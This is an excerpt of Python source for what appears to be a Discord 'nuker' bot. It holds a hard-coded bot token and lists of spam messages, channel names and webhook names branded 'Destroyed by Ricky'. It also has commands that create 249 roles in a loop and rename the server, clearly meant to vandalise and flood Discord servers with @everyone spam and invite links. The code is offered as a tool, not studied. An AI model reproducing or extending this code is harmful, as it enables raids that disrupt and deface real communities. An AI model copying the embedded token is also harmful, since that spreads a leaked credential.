...
token = "ODg3OTM5MDIxMDcyOTIwNTk3.YULbpw.29oqzTbvx9kv_DNsRql263npRe4"


CHANNEL_NAMES = ["DestroyedbyRicky", "FUCKEDBYRicky", "RickyOP"]
MESSAGE_CONTENTS = ["@everyone RICKY SE PANGA LOGE LO HOGE NANGE https://discord.gg/TH6HsrGhyx @here", "@everyone RICKY  SE PANGA LOGE LO HOGE NANGE https://discord.gg/rickyop @here", "@everyone RICKY SE PANGA LOGE LO HOGE NANGE https://discord.gg/rickyop @here " ]
WEBHOOK_NAMES = ['DestroyedbyRICKY','RICKY.ONTOP','AURLOPNGE']
...
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game       (name= "RICKY.EXE"))
...
async def roles(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"RICKYONTOP")
      print("Created Roles")
    except:
...
async def wizz(ctx, amount=50):
  await ctx.guild.edit(name="RICKY ON TOP")
...
async def help(ctx, *args):
    ...
    embed.set_footer(text=f'TERA BAAP RICKY HAI')
